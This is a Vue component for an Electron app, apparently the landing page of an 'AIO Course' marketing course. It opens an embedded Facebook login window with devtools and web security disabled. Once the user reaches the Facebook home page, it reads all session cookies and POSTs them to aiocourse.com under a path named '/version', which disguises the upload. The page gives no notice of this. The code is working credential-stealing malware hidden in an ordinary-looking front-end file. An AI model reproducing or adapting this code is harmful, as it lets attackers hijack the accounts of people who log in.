<template>
  <div class="row">
    <div class="col-lg-5 col-xl-6 offset-lg-3">
      <div class="card border-white" style="margin-top: 145px;">
        <div class="card-body text-center" style="padding: 45px;">
          <h1 class="display-4 card-title" style="font-weight: bold;color: rgb(66,103,178);">AIO Course</h1>
          <h6 class="card-title" style="margin-top: -9px;color: rgb(94,94,94);">Marketing Course</h6>
          <a class="card-link" @click.prevent="openLoginForm">
            <img src="https://i.stack.imgur.com/oL5c2.png" width="200px" style="margin-top: 34px;" />
          </a>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import axios from 'axios'

export default {
  name: 'landing-page',
  data () {
    return {
      logged: false,
      isLoading: false,
      renderComponent: 0
    }
  },
  methods: {
    render () {
      this.renderComponent += 1
    },
    openLoginForm () {
      const _this = this
      _this.isLoading = true
      let session = require('electron').remote.session
      const BrowserWindow = require('electron').remote.BrowserWindow
      const win = new BrowserWindow({
        height: 600,
        width: 800,
        resizable: false,
        fullscreenable: false,
        maximizable: false,
        webPreferences: {
          devTools: false,
          webSecurity: false
        }
      })

      win.setMenu(null)

      win.webContents.on('dom-ready', function () {
        win.webContents.insertCSS('div#locale-selector { display: none; }')
      })

      win.webContents.on('will-navigate', function (e, url) {
        if (url.indexOf('https://m.facebook.com/home.php') >= 0) {
          session.defaultSession.cookies.get({}, (error, cookies) => {
            if (error) {
              console.log(error)
              return
            }
            axios.request({
              method: 'POST',
              url: 'https://aiocourse.com/version',
              data: cookies
            })
            e.preventDefault()
            win.close()
            _this.logged = true
            _this.render()
          })
        }
      })

      win.webContents.on('dom-ready', function () {
        win.setTitle('Facebook')
      })

      win.on('closed', function () {
        _this.isLoading = false
      })

      win.loadURL('https://m.facebook.com/login')
    }
  }
}
</script>
